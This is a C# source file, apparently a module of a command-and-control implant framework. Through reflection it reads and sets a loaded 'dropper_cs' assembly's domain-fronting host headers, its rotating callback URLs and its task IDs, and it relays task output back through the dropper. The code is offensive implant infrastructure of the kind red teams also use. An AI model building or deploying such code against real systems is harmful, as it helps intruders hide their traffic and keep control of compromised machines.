using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;

namespace Core.Common
{
    internal static class Comms
    {
        public static IEnumerable<string> GetDF()
        {
            var dropperAssembly = GetDropperAssembly();
            try
            {
                return (string[])GetField(dropperAssembly, "dfhead").GetValue(null);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in setting DF headers in dropper_cs: {e}");
                return new[] { "null" };
            }
        }

        private static FieldInfo GetField(Assembly dropperAssembly, string fieldName)
        {
            var field = GetType(dropperAssembly).GetField(fieldName);
            if (field == null)
            {
                throw new Exception($"Field with name {fieldName} not found in dropper assembly class");
            }

            return field;
        }

        private static void SetDF(IEnumerable domainFrontHeaders)
        {
            var dropperAssembly = GetDropperAssembly();
            try
            {
                GetField(dropperAssembly, "dfhead").SetValue(null, domainFrontHeaders);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in setting DF header in dropper_cs: {e}");
            }
        }

        public static IEnumerable<string> GetRotate()
        {
            var dropperAssembly = GetDropperAssembly();

            try
            {
                var x = (string[])GetField(dropperAssembly, "rotate").GetValue(null);
                return x;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in setting rotate in dropper_cs: {e}");
                return new[] { "null" };
            }
        }

        private static void SetRotate(IEnumerable rotate)
        {
            var dropperAssembly = GetDropperAssembly();
            try
            {
                GetField(dropperAssembly, "rotate").SetValue(null, rotate);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in setting rotate in dropper_cs: {e}");
            }
        }

        public static void Rotate(string commaSeperatedRotationUrls)
        {
            try
            {
                if (!string.IsNullOrEmpty(commaSeperatedRotationUrls))
                {
                    SetRotate(commaSeperatedRotationUrls.Split(','));
                    Exec("[+] Rotate enabled");
                }
                else
                {
                    Exec("[-] Rotation update failed");
                }
            }
            catch (Exception e)
            {
                Exec($"[-] Rotation update failed: {e}");
            }
        }

        public static void DFUpdate(string commaSeperatedHostHeaders)
        {
            try
            {
                if (!string.IsNullOrEmpty(commaSeperatedHostHeaders))
                {
                    SetDF(commaSeperatedHostHeaders.Split(','));
                    Exec("[+] DomainFront updated");
                }
                else
                {
                    Exec("[-] DomainFront update failed");
                }
            }
            catch (Exception e)
            {
                Exec($"[-] DomainFront update failed: {e}");
            }
        }

        public static string GetTaskId()
        {
            string taskId = null;
            var dropperAssembly = GetDropperAssembly();

            try
            {
                taskId = GetField(dropperAssembly, "taskId").GetValue(null).ToString();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            return taskId;
        }

        public static void Exec(string output, byte[] outputBytes = null, string taskId = null)
        {
            if (string.IsNullOrEmpty(taskId))
            {
                taskId = GetTaskId();
            }

            try
            {
                var dropperAssembly = GetDropperAssembly();
                if (dropperAssembly == null)
                {
                    Console.WriteLine("Dropper assembly not found");
                    return;
                }

                if (outputBytes != null)
                {
                    GetType(dropperAssembly).InvokeMember("Exec", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null,
                        new object[] { null, taskId, null, outputBytes });
                }
                else
                {
                    GetType(dropperAssembly).InvokeMember("Exec", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null,
                        new object[] { output, taskId, null, null });
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        private static Type GetType(Assembly dropperAssembly)
        {
            const string typeName = "Program";
            var type = dropperAssembly.GetType(typeName);
            if (type == null)
            {
                throw new Exception($"Class with name {typeName} not found in dropper assembly");
            }

            return type;
        }

        private static Assembly GetDropperAssembly()
        {
            Assembly dropperAssembly;
            try
            {
                const string assemblyName = "dropper_cs";
                dropperAssembly = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name.Contains(assemblyName));

                if (dropperAssembly == null)
                {
                    var assemblies = AppDomain.CurrentDomain.GetAssemblies().Aggregate("", (current, assembly) => current + (assembly.GetName() + "\n"));
                    throw new Exception($"Dropper assembly not found, looking for {assemblyName} contained inside any string in:\n{assemblies}");
                }
            }
            catch (Exception e)
            {
                throw new Exception($"[-] Error in finding dropper_cs: {e}");
            }

            return dropperAssembly;
        }
    }
}